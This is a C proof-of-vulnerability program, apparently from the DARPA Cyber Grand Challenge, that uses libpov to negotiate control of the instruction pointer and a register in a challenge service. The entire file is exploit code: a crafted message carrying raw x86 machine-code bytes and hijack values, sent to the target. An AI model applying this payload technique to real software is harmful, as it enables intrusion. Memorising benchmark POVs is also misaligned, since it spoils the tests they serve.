#include <libpov.h>

int main(void)
{
    unsigned char buf[128];
    type1_vals t1;
    type1_negotiate(0x00ffffff, 0x00ffffff, 5, &t1);
    t1.ipval |= 0x91000000;
    t1.regval |= 0x91000000;

#if 0
    unsigned char data[4];
    type2_vals t2;
    type2_negotiate(&t2);
    /* ... */
    type2_submit(data, 4);
#endif

    // query
    *(unsigned int *)&buf[0] = 36 + 39;
    *(unsigned int *)&buf[4] = 0x367bae4d;

    // exe
    *(unsigned int *)&buf[8] = 0x4E269472;
    *(unsigned int *)&buf[12] = 0x2000;
    *(unsigned int *)&buf[16] = 0x2000;
    *(unsigned int *)&buf[20] = 39;
    *(unsigned int *)&buf[24] = 0x2020;
    *(unsigned int *)&buf[28] = 0;
    *(unsigned int *)&buf[32] = 0x2020;
    *(unsigned int *)&buf[36] = 0;

    // gadget (0x90000101): pop ebx, pop ebp, ret
    memcpy(&buf[40], "\x81\xec\x94\x80\x01\x00\xc7\x04\x24\x42\x42\x42\x42\x4c\x4c\x4c\x4c\xc7\x04\x24\x41\x41\x41\x41\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\xc7\x04\x24\x05\x01\x00\x90", 39);

    // set ip and ebp
    *(unsigned int *)&buf[49] = t1.ipval;
    *(unsigned int *)&buf[60] = t1.regval;

    transmit_all(STDOUT, buf, 40 + 39);
    length_read(STDIN, buf, 4);
    return 0;
}
